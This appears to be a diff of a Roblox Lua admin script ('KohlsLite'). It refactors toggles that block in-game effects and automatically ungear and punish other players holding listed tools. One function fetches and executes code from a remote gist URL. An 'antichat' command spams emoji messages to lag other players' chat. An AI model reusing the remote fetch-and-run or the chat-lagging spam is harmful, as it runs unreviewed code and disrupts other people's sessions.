         elseif args[2] == "others" then
                 ALLantistun = true
@@ -5962,7 +5892,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantistun' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantistun = false
+                antis.antistun = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantistun = false
@@ -5979,7 +5909,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antistg' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantisetgrav = true
+                antis.antisetgrav = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantisetgrav = true
@@ -5996,7 +5926,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantistg' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantisetgrav = false
+                antis.antisetgrav = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantisetgrav = false
@@ -6013,7 +5943,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antiswag' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiswag = true
+                antis.antiswag = true
                 Remind("Turned this anti on for you!")
         elseif args[2] == "others" then
                 ALLantiswag = true
@@ -6030,7 +5960,7 @@ Commands required: rocket]])
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantiswag' then
         local args = string.split(msg, " ")
         if args[2] == "me" then
-                YOUantiswag = false
+                antis.antiswag = false
                 Remind("Turned this anti off for you!")
         elseif args[2] == "others" then
                 ALLantiswag = false
@@ -6046,13 +5976,13 @@ Commands required: rocket]])
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antichat' then
         antichat = true
-        YOUantimsg = true -- stop you from crashing :)
+        antis.antimessage = true -- stop you from crashing :)
 	Remind("Spamming h messages with emojis to lag and remove chat for people")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantichat' then
         antichat = false
-        YOUantimsg = false
+        antis.antimessage = false
 	Remind("No longer spamming h messages with emojis to lag and remove chat for people")
     end
 
@@ -6120,22 +6050,22 @@ Commands required: rocket]])
     end
 
     if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'autoff' then
-        autoff = true
+        autos.autoff = true
         Remind("Auto ff is on!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unautoff' then
-        autoff = false
+        autos.autoff = false
         Remind("Auto ff is off!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'autogod' then
-        autogod = true
+        autos.autogod = true
         Remind("Auto god is on!")
     end
 
     if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unautogod' then
-        autogod = false
+        autos.autogod = false
         Remind("Auto god is off!")
     end      
 
@@ -6717,9 +6647,39 @@ Commands required: rocket]])
 
 end)
 
+-- PLAYER CHECK
+function PLAYERCHECK(plr)
+  for i, v in pairs(game.Players:GetPlayers()) do
+      if string.sub(v.Name:lower(), 1, #plr) == plr:lower() then
+          player = v.Name
+          cplr = v
+          Remind("[debug]: Found "..player)
+      end
+  end
+end
+
+-- Only uses for blacklisting, there is NO way I am coding it for everything
+function bypassattemptcheck(plr)
+                if string.sub(string.lower(plr), 1,3) == "me_" then
+                        return true, "m"
+                elseif string.sub(string.lower(plr), 1,4) == "all_" then
+                        return true, "al"
+                elseif string.sub(string.lower(plr), 1,7) == "others_" then
+                        return true, "other"        
+                elseif string.sub(string.lower(plr), 1,8) == "friends_" then
+                        return true, "frien"
+                elseif string.sub(string.lower(plr), 1,7) == "admins_" then
+                        return true, "admi"
+                elseif string.sub(string.lower(plr), 1,10) == "nonadmins_" then
+                        return true, "nonadmi"
+                elseif string.sub(string.lower(plr), 1,7) == "random_" then
+                        return true, "rando"
+                end
+end
+
 function CMDPrint()
 	GExecute("https://gist.githubusercontent.com/S-PScripts/86b332526c70fe7c9585bddd3e58101c/raw/7f3bb1759ab1e1d4a5178390796f6852f2304369/KL%2520CMD%2520LIST.lua")
-	print("newkl - loads KohlsLite v2 aka KohlsECO")
+	print("newkl - loads KohlsECO (KohlsLite v2). This is not updated anymore since I decided to revive KL v1.")
 end
 
 -- CHECK FOR PERM
@@ -6959,335 +6919,359 @@ task.spawn(function()
         end
 end)
 
--- ANTIS FOR YOU ONLY
-task.spawn(function()
-        while true do
-        task.wait()
-        if YOUantiblind == true then
-           for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
+antis = {
+    antiblind = false,
+    antivoid = false,
+    antiskydive = false,
+    antigrayscale = false,
+    antiaddon = false,
+    anticlone = false,
+    antidog = false,
+    antifire = false,
+    antifreeze = false,
+    antifly = false,
+    antinoclip = false,
+    antiff = false,
+    antiglow = false,
+    antihealthchange = false,
+    antijail = false,
+    antikill = false,
+    antimessage = false,
+    antiname = false,
+    antichar = false,
+    antiparticles = false,
+    antipunish = false,
+    antirocket = false,
+    antisit = false,
+    antiseizure = false,
+    antismoke = false,
+    antisparkles = false,
+    antispeed = false,
+    antispin = false,
+    antistun = false,
+    antisetgrav = false,
+    antiswag = false
+}
+
+autos = {
+	autoff = false,
+	autogod = false,
+	tempautoff = false,
+	tempautogod = false
+}
+
+local connections = {}
+local lp = game.Players.LocalPlayer
+
+connections[#connections + 1] =
+    game:GetService("RunService").RenderStepped:Connect(function()
+
+  	if autos.autoff == true or autos.tempautoff == true then
+            if not lp.Character:FindFirstChild("ForceField") then
+                Chat("ff me")
+                task.wait(0.1)
+            end
+        end
+
+        if autos.autogod == true or autos.tempautogod == true then
+            if tostring(lp.Character.Humanoid.MaxHealth) ~= "inf" then
+                    Chat("god me")
+                    lp.Character.Humanoid.MaxHealth = math.huge
+                    lp.Character.Humanoid.Health = 9e9            
+            end
+        end
+
+        if antis.antiblind == true then
+            for i, v in pairs(lp.PlayerGui:GetDescendants()) do
                 if v.Name == "EFFECTGUIBLIND" then
                     v:Destroy()
                 end
             end
         end
 
-	if YOUantivoid == true then 
-		if game.Players.LocalPlayer.Character --[[ and game.Players.LocalPlayer.Character.HumanoidRootPart]] then
-            		if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < -7 then
-                		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,5,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
-                		game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X,0,game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z)
-            		end
-		end
-	end
-
-	if YOUantisky == true then 
-		if game.Players.LocalPlayer.Character --[[ and game.Players.LocalPlayer.Character.HumanoidRootPart]] then
-            		if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y > 256 then
-                		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,5,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
-                		game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X,0,game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z)
-            		end
-		end
-	end
-			
-        if YOUantigs == true then
-                if game.Workspace.CurrentCamera:FindFirstChild("GrayScale") then
-                        game.Workspace.CurrentCamera:FindFirstChild("GrayScale"):Destroy()        
+        if antis.antivoid == true then
+            if lp.Character --[[ and lp.Character.HumanoidRootPart]] then
+                if lp.Character.HumanoidRootPart.Position.Y < -7 then
+                    lp.Character.HumanoidRootPart.CFrame = 
+					CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
+                    lp.Character.HumanoidRootPart.Velocity = 
+					Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
                 end
-        end
-
-        if YOUantiaddon == true then
-            if game.Players.LocalPlayer.Character:FindFirstChild("Addon") then
-                    game.Players.LocalPlayer.Character:FindFirstChild("Addon"):Destroy()
-                    Chat("reset me")
             end
         end
 
-        if YOUanticlone == true then
-            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(game.Players.LocalPlayer.Name) then
+        if antis.antiskydive == true then
+            if lp.Character --[[ and lp.Character.HumanoidRootPart]] then
+                if lp.Character.HumanoidRootPart.Position.Y > 256 then
+                    lp.Character.HumanoidRootPart.CFrame =
+                        CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
+                    lp.Character.HumanoidRootPart.Velocity =
+                        Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
+                end
+            end
+        end
+
+        if antis.antigrayscale == true then
+            if game.Workspace.CurrentCamera:FindFirstChild("GrayScale") then
+                game.Workspace.CurrentCamera:FindFirstChild("GrayScale"):Destroy()
+            end
+        end
+
+        if antis.antiaddon == true then
+            if lp.Character:FindFirstChild("Addon") then
+                lp.Character:FindFirstChild("Addon"):Destroy()
+                Chat("reset me")
+            end
+        end
+
+        if antis.anticlone == true then
+            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(lp.Name) then
                 Chat("unclone me")
             end
         end
 
-        if YOUantidog == true then
-                for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-                        if v:IsA("Seat") then
-                                Chat("undog me")
-                        end
-                    end
+        if antis.antidog == true then
+            for i, v in pairs(lp.Character:GetDescendants()) do
+                if v:IsA("Seat") then
+                    Chat("undog me")
+                end
+            end
         end
 
-     --[[   if YOUantifling == true then
-			if game.Players.LocalPlayer.Character:FindFirstChild("BFRC") then
-           			local player = game.Players.LocalPlayer
-                    		local humanoid = player.Character:WaitForChild("Humanoid", 1)
-                    		if humanoid and humanoid.Sit then
-                        		humanoid.Sit = false
-                        		Chat("unsit me")
-                    		end
-				game.Players.LocalPlayer.Character.Torso.AssemblyLinearVelocity = Vector3.new(0,0,0)
-				fwait()
-				game.Players.LocalPlayer.Character:FindFirstChild("BFRC"):Destroy()
-				game.Players.LocalPlayer.Character.Torso.AssemblyLinearVelocity = Vector3.new(0,0,0)
-	                end
-        end]]
-
-        if YOUantifire == true then
-            if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
-                if game.Players.LocalPlayer.Character.Torso:FindFirstChild("Fire") then
-                    game.Players.LocalPlayer.Character.Torso:FindFirstChild("Fire"):Destroy()
+        if antis.antifire == true then
+            if lp.Character:FindFirstChild("Torso") then
+                if lp.Character.Torso:FindFirstChild("Fire") then
+                    lp.Character.Torso:FindFirstChild("Fire"):Destroy()
                     Chat("unfire me")
                 end
             end
         end
 
-        if YOUantifreeze == true then
-             if game.Players.LocalPlayer.Character:FindFirstChild("ice") then
+        if antis.antifreeze == true then
+            if lp.Character:FindFirstChild("ice") then
                 Chat("thaw me")
             end
         end
 
-        if YOUantifly == true then
-            if not game.Players.LocalPlayer.Character:FindFirstChild("Seizure") and game.Players.LocalPlayer.Character.Humanoid:GetState().Name == "PlatformStanding" then
+        if antis.antifly == true then
+            if not lp.Character:FindFirstChild("Seizure") and lp.Character.Humanoid:GetState().Name == "PlatformStanding" then
                 Chat("unfly me")
                 Chat("clip me")
- 		if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Torso then 
-                        game.Players.LocalPlayer.Character.Torso.Anchored = false 
+                if lp.Character and lp.Character.Torso then
+                    lp.Character.Torso.Anchored = false
                 end
-                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid then 
-                        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false 
+                if lp.Character and lp.Character.Humanoid then
+                    lp.Character.Humanoid.PlatformStand = false
                 end
             end
         end
 
-        if YOUantinoclip == true then
-            if game.Players.LocalPlayer.PlayerGui:FindFirstChild("NoClip") then
-                game.Players.LocalPlayer.PlayerGui:FindFirstChild("NoClip"):Destroy()
-                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Torso then 
-                        game.Players.LocalPlayer.Character.Torso.Anchored = false 
+        if antis.antinoclip == true then
+            if lp.PlayerGui:FindFirstChild("NoClip") then
+                lp.PlayerGui:FindFirstChild("NoClip"):Destroy()
+                if lp.Character and lp.Character.Torso then
+                    lp.Character.Torso.Anchored = false
                 end
-                if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid then 
-                        game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false 
+                if lp.Character and lp.Character.Humanoid then
+                    lp.Character.Humanoid.PlatformStand = false
                 end
                 Chat("clip me")
             end
         end
 
-        if YOUantiff == true then
-         if game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
-                game.Players.LocalPlayer.Character:FindFirstChild("ForceField"):Destroy()
+        if antis.antiff == true then
+            if lp.Character:FindFirstChild("ForceField") then
+                lp.Character:FindFirstChild("ForceField"):Destroy()
                 Chat("unff me")
             end
         end
 
-        if autoff == true or tempautoff == true then
-            if not game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
-                Chat("ff me")
-                task.wait(0.1)
+        if antis.antiff == true then
+            local torso = lp.Character:WaitForChild("Torso", 1)
+            for i, v in pairs(torso:GetChildren()) do
+                if v:IsA("PointLight") then
+                    v:Destroy()
+                    Chat("unglow me")
+                end
             end
         end
 
-        if autogod == true or tempautogod == true then
-            if tostring(game.Players.LocalPlayer.Character.Humanoid.MaxHealth) ~= "inf" then
-                    Chat("god me")
-                game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
-                game.Players.LocalPlayer.Character.Humanoid.Health = 9e9            
+        if antis.antihealthchange == true then
+            if lp.Character.Humanoid and lp.Character.Humanoid.Health ~= 100 then
+                Chat("health me 100")
             end
         end
 
-        if YOUantiglow == true then
-                local torso = game.Players.LocalPlayer.Character:WaitForChild("Torso", 1)
-                        for i,v in pairs(torso:GetChildren()) do
-                                if v:IsA("PointLight") then
-                                                    v:Destroy()
-                                                    Chat("unglow me")
-                                       end
-                            end
-        end
-
-        if YOUantihealthc == true then
-           if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.Health ~= 100 then
-                Chat("health me 100")         
-           end
-        end
-
-        if YOUantijail == true then
-            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(game.Players.LocalPlayer.Name .. "'s jail") then
+        if antis.antijail == true then
+            if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(lp.Name .. "'s jail")
+             then
                 Chat("unjail me")
             end
         end
 
-        if YOUantijump == true then
-            if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.JumpPower ~= 50 then
-                game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+        if antis.antijump == true then
+            if lp.Character.Humanoid and lp.Character.Humanoid.JumpPower ~= 50 then
+                lp.Character.Humanoid.JumpPower = 50
             end
         end
 
-        if editedjump == true then
-            if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.JumpPower ~= editedjumpis then
-                game.Players.LocalPlayer.Character.Humanoid.JumpPower = editedjumpis
-            end
-        end
-
-        if YOUantikill == true then
-           if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
-                    Chat("reset me")
-           end
-        end
-
-        if YOUantimsg == true then
-                for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
-                        if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" or v.Name == "Ice" then
-                                    v:Destroy()
-                        end
-                end
-                for i, v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
-                        if v.Name == "Message" then
-                                v:Destroy()
-                        end
-                end
-        end
-
-        if YOUantiname == true then
-             if game.Players.LocalPlayer and game.Players.LocalPlayer.Character:FindFirstChildOfClass("Model") then
+        if antis.antikill == true then
+            if lp.Character.Humanoid and lp.Character.Humanoid.Health == 0 then
                 Chat("reset me")
-             end
+            end
         end
 
-        if YOUantichar == true then
-           if game.Players.LocalPlayer.UserId ~= game.Players.LocalPlayer.CharacterAppearanceId then
-              Chat("unchar me")
-           end
+        if antis.antimessage == true then
+            for i, v in pairs(lp.PlayerGui:GetDescendants()) do
+                if v.Name == "MessageGUI" or v.Name == "Message" or v.Name == "HintGUI" or v.Name == "Ice" then
+                    v:Destroy()
+                end
+            end
+            for i, v in pairs(game.Workspace.Terrain["_Game"].Folder:GetDescendants()) do
+                if v.Name == "Message" then
+                    v:Destroy()
+                end
+            end
         end
 
-        if YOUantiparticles == true then
-                local torso = game.Players.LocalPlayer.Character:WaitForChild("Torso", 1)
-                        for i,v in pairs(torso:GetChildren()) do
-                                if v:IsA("ParticleEmitter") then
-                                                    v:Destroy()
-                                                    Chat("unparticle me")
-                                       end
-                            end
+        if antis.antiname == true then
+            if lp and lp.Character:FindFirstChildOfClass("Model") then
+                Chat("unname me")
+            end
         end
 
-        if YOUantipunish == true then
-            if game.Lighting:FindFirstChild(game.Players.LocalPlayer.Name) then
+        if antis.antichar == true then
+            if lp.UserId ~= lp.CharacterAppearanceId then
+                Chat("unchar me")
+            end
+        end
+
+        if antis.antiparticles == true then
+            local torso = lp.Character:WaitForChild("Torso", 1)
+            for i, v in pairs(torso:GetChildren()) do
+                if v:IsA("ParticleEmitter") then
+                    v:Destroy()
+                    Chat("unparticle me")
+                end
+            end
+        end
+
+        if antis.antipunish == true then
+            if game.Lighting:FindFirstChild(lp.Name) then
                 Chat("unpunish me")
             end
         end
 
-        if YOUantirocket == true then
-                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-                        if v.Name == "Rocket" then 
-                             v:Destroy()
-                        end
+        if antis.antirocket == true then
+            for i, v in pairs(lp.Character:GetChildren()) do
+                if v.Name == "Rocket" then
+                    lp.Character.Rocket.CanCollide = false
+                    task.wait(0.5)
+                    v:Destroy()
                 end
-        end
-
-        if YOUantisit == true then
-           local player = game.Players.LocalPlayer
-                     if player.Character then
-                    local humanoid = player.Character:WaitForChild("Humanoid", 1)
-                    if humanoid and humanoid.Sit then
-                        humanoid.Sit = false
-                        Chat("unsit me")
-                    end
-                     end
-        end
-
-        if YOUantiseizure == true then
-            if game.Players.LocalPlayer.Character:FindFirstChild("Seizure") then
-                Chat("unseizure me")
-		game.Players.LocalPlayer.Character.Torso.AssemblyLinearVelocity = Vector3.new(0,0,0)
-		fwait()
-		game.Players.LocalPlayer.Character:FindFirstChild("Seizure"):Destroy()
-		game.Players.LocalPlayer.Character.Torso.AssemblyLinearVelocity = Vector3.new(0,0,0)
-		game.Players.LocalPlayer.Character.Humanoid:ChangeState("GettingUp")
             end
         end
 
-        if YOUantismoke == true then
-             if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
-                if game.Players.LocalPlayer.Character.Torso:FindFirstChild("Smoke") then
-                    game.Players.LocalPlayer.Character.Torso:FindFirstChild("Smoke"):Destroy()
+        if antis.antisit == true then
+            local player = lp
+            if player.Character then
+                local humanoid = player.Character:WaitForChild("Humanoid", 1)
+                if humanoid and humanoid.Sit then
+                    humanoid.Sit = false
+                    Chat("unsit me")
+                end
+            end
+        end
+
+        if antis.antiseizure == true then
+            if lp.Character:FindFirstChild("Seizure") then
+                Chat("unseizure me")
+                lp.Character.Torso.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                fwait()
+                lp.Character:FindFirstChild("Seizure"):Destroy()
+                lp.Character.Torso.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                lp.Character.Humanoid:ChangeState("GettingUp")
+            end
+        end
+
+        if antis.antismoke == true then
+            if lp.Character:FindFirstChild("Torso") then
+                if lp.Character.Torso:FindFirstChild("Smoke") then
+                    lp.Character.Torso:FindFirstChild("Smoke"):Destroy()
                     Chat("unsmoke me")
                 end
             end
         end
 
-        if YOUantisparkles == true then
-                local torso = game.Players.LocalPlayer.Character:WaitForChild("Torso", 1)
-                        for i,v in pairs(torso:GetChildren()) do
-                                if v:IsA("Sparkles") then
-                                                    v:Destroy()
-                                                    Chat("unsparkle me")
-                                       end
-                            end
-        end
-
-        if YOUantispeed == true then
-            if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= 16 then
-                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
-            end
-        end
-
-        if editedspeed == true then
-            if game.Players.LocalPlayer.Character.Humanoid and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= editedspeedis then
-                game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = editedspeedis
-            end
-        end
-
-        if YOUantispin == true then
-                if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
-                        if game.Players.LocalPlayer.Character.Torso:FindFirstChild("SPINNER") then
-                                game.Players.LocalPlayer.Character.Torso:FindFirstChild("SPINNER"):Destroy()
-                                    Chat("unspin me")
-                        end
+        if antis.antisparkles == true then
+            local torso = lp.Character:WaitForChild("Torso", 1)
+            for i, v in pairs(torso:GetChildren()) do
+                if v:IsA("Sparkles") then
+                    v:Destroy()
+                    Chat("unsparkle me")
                 end
+            end
         end
 
-        if YOUantistun == true then
-            local player = game.Players.LocalPlayer
-             if player.Character then
-                    local humanoid = player.Character:WaitForChild("Humanoid", 1)
-                    if humanoid and humanoid.PlatformStand then
-                        humanoid.PlatformStand = false
-                        Chat("unstun me")
+        if antis.antispeed == true then
+            if lp.Character.Humanoid and lp.Character.Humanoid.WalkSpeed ~= 16 then
+                lp.Character.Humanoid.WalkSpeed = 16
+            end
+        end
+
+        if antis.antispin == true then
+            if lp.Character:FindFirstChild("Torso") then
+                if lp.Character.Torso:FindFirstChild("SPINNER") then
+                    lp.Character.Torso:FindFirstChild("SPINNER"):Destroy()
+                    Chat("unspin me")
+                end
+            end
+        end
+
+        if antis.antistun == true then
+            local player = lp
+            if player.Character then
+                local humanoid = player.Character:WaitForChild("Humanoid", 1)
+                if humanoid and humanoid.PlatformStand then
+                    humanoid.PlatformStand = false
+                    Chat("unstun me")
+                end
+            end
+        end
+
+        if antis.antisetgrav == true then
+            if lp.Character:FindFirstChild("Torso") then
+                lproot = lp.Character.HumanoidRootPart
+                for i, v in pairs(lp.Character:GetDescendants()) do
+                    if v:IsA("BodyForce") then
+                        v:Destroy()
+                        v.Force = Vector3.new(0, 0, 0)
+                        lproot.Velocity = Vector3.new(0, 0, 0)
+                        lp.Character.HumanoidRootPart.CFrame =
+                        	CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
+                    	lp.Character.HumanoidRootPart.Velocity =
+                        	Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
                     end
-             end
-        end
 
-        if YOUantisetgrav == true then
-                if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
-			lproot = game.Players.LocalPlayer.Character.HumanoidRootPart
-			for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
-				if v:IsA("BodyForce") then
-						v:Destroy()
-						v.Force = Vector3.new(0, 0, 0)
-					        lproot.Velocity = Vector3.new(0, 0, 0)
-						Chat("setgrav me 0")
-						Chat("unskydive me")
-
-				end
-				
-				if v:IsA("BodyPosition") then
-						v:Destroy()
-					        lproot.Velocity = Vector3.new(0, 0, 0)
-						Chat("setgrav me 0")
-						Chat("unskydive me")
-				end
-			end
+                    if v:IsA("BodyPosition") then
+                        v:Destroy()
+                        lproot.Velocity = Vector3.new(0, 0, 0)
+			lp.Character.HumanoidRootPart.CFrame =
+                        	CFrame.new(lp.Character.HumanoidRootPart.Position.X,5,lp.Character.HumanoidRootPart.Position.Z)
+                    	lp.Character.HumanoidRootPart.Velocity =
+                        	Vector3.new(lp.Character.HumanoidRootPart.Velocity.X,0,lp.Character.HumanoidRootPart.Velocity.Z)
+                    end
                 end
+            end
         end
 
-        if YOUantiswag == true then
-                if game.Players.LocalPlayer.Character:FindFirstChild("EpicCape") then
-                        game.Players.LocalPlayer.Character:FindFirstChild("EpicCape"):Destroy()
-                        Chat("normal me")
-                end
+        if antis.antiswag == true then
+            if lp.Character:FindFirstChild("EpicCape") then
+                lp.Character:FindFirstChild("EpicCape"):Destroy()
+                Chat("normal me")
+            end
         end
-
-        end
-end)
+    end)
 
 -- ANTIS FOR EVERYONE
 task.spawn(function()
@@ -7506,105 +7490,277 @@ task.spawn(function()
         end
 end)
 
--- PLAYER CHECK
-function PLAYERCHECK(plr)
-  for i, v in pairs(game.Players:GetPlayers()) do
-      if string.sub(v.Name:lower(), 1, #plr) == plr:lower() then
-          player = v.Name
-          cplr = v
-          Remind("[debug]: Found "..player)
-      end
-  end
-end
+-- Antis (tool related)
+local crashTools = {"OrinthianSwordAndShield", "VampireVanquisher","Emerald Knights of the Seventh Sanctum Sword and Shield"}
+local attachTools = {"IvoryPeriastron"}
+local nogearTools = {"PortableJustice"}
+local colourTools = {"PaintBucket", "SubspaceTripmine"}
+local miscTools = {"DaggerofShatteredDimensions", "SledgeHammer", "AR", "Transmorpher"}
+local ninejntools = {"HyperlaserGun","Transmorpher","ConfusoRay-672"}
+local crashToolsLP = {"DriveBloxUltimateCar","BlueBucket","HotPotato"}
 
--- Only uses for blacklisting, there is NO way I am coding it for everything
-function bypassattemptcheck(plr)
-                if string.sub(string.lower(plr), 1,3) == "me_" then
-                        return true, "m"
-                elseif string.sub(string.lower(plr), 1,4) == "all_" then
-                        return true, "al"
-                elseif string.sub(string.lower(plr), 1,7) == "others_" then
-                        return true, "other"        
-                elseif string.sub(string.lower(plr), 1,8) == "friends_" then
-                        return true, "frien"
-                elseif string.sub(string.lower(plr), 1,7) == "admins_" then
-                        return true, "admi"
-                elseif string.sub(string.lower(plr), 1,10) == "nonadmins_" then
-                        return true, "nonadmi"
-                elseif string.sub(string.lower(plr), 1,7) == "random_" then
-                        return true, "rando"
-                end
-end
-
--- ANTI CRASH 2 (it can work better than anticrash one at times!)
+-- Function for the antis
 game:GetService("RunService").RenderStepped:Connect(function()
         task.wait(0)
-        for i, v in ipairs(game.Players:GetPlayers()) do
-            if v.Backpack and v.Character then
-                    if v.Backpack:FindFirstChild("VampireVanquisher") or v.Character:FindFirstChild("VampireVanquisher") then
-                               if v ~= game.Players.LocalPlayer and anticrash2 == true and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name)) then
-                                Chat("ungear "..v.Name)
-                                Chat("punish "..v.Name)
-                                Chat("h \n\n\n Sorry, "..v.Name.. ", you cannot use the Vampire Vanquisher due to anti crash (2). \n\n\n")
-                               end
-                    end
 
-                    if v.Backpack:FindFirstChild("OrinthianSwordAndShield") or v.Character:FindFirstChild("OrinthianSwordAndShield") then
-                               if v ~= game.Players.LocalPlayer and anticrash2 == true and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))  then
-                                Chat("ungear "..v.Name)
-                                Chat("punish "..v.Name)
-                                Chat("h \n\n\n Sorry, "..v.Name.. ", you cannot use the Orinthian Sword and Shield due to anti crash (2). \n\n\n")
-                               end
-                    end
+		for i, v in game.Players:GetPlayers() do
+				if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+					if v.Backpack:FindFirstChildOfClass("Tool") then
+						if antigear then
+							Chat("ungear " .. v.Name)
+							Chat("punish " .. v.Name)
+							Chat("clr")
+							Chat(prefix.."regen")
+						end
+					end
+				end
 
-                if v.Backpack:FindFirstChild("DriveBloxUltimateCar") then
-                               if v == game.Players.LocalPlayer and antikick2 == true then
-                                game.Players.LocalPlayer.Backpack:FindFirstChild("DriveBloxUltimateCar"):Destroy()
-                                Chat("ungear me")
-                               end
-                    end
+				if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+					if v.Character and v.Character:FindFirstChildOfClass("Tool") then
+						if antigear then
+							Chat("ungear " .. v.Name)
+							Chat("punish " .. v.Name)
+							Chat("clr")
+							Chat(prefix.."regen")
+						end
+					end
+				end
+		end
 
-                if v.Character:FindFirstChild("DriveBloxUltimateCar") then
-                               if v == game.Players.LocalPlayer and antikick2 == true then
-                                        game.Players.LocalPlayer.Character:FindFirstChild("DriveBloxUltimateCar"):Destroy()
-                                        Chat("ungear me")
-                               end
-                    end
+		for i, tool in crashTools do
+				for i, v in game.Players:GetPlayers() do
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Backpack:FindFirstChild(tool) then
+							if emranticrash then
+								Chat("ungear others")
+								Chat("punish others")
+								Chat("clr")
+								Chat(prefix .. "regen")
+							elseif anticrash then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
+								Chat(prefix .. "regen")
+							else end
+						end
+					end
 
-                if v.Backpack:FindFirstChild("BlueBucket") or v.Character:FindFirstChild("BlueBucket") then -- doesn't even kick anymore lmao
-                               if v == game.Players.LocalPlayer and antikick2 == true then
-                                game.Players.LocalPlayer:FindFirstChild("BlueBucket"):Destroy()
-                                Chat("ungear me")
-                               end
-                    end
+					if v.Name ~= game.Players.LocalPlayer.Name and (not table.find(GWhitelisted, v.Name) and not table.find(pgwl, v.Name))then
+						if v.Character and v.Character:FindFirstChild(tool) then
+							if emranticrash then
+								Chat("ungear others")
+								Chat("punish others")
+								Chat("clr")
+								Chat(prefix .. "regen")
+							elseif anticrash then
+								Chat("ungear " .. v.Name)
+								Chat("punish " .. v.Name)
+								Chat("clr")
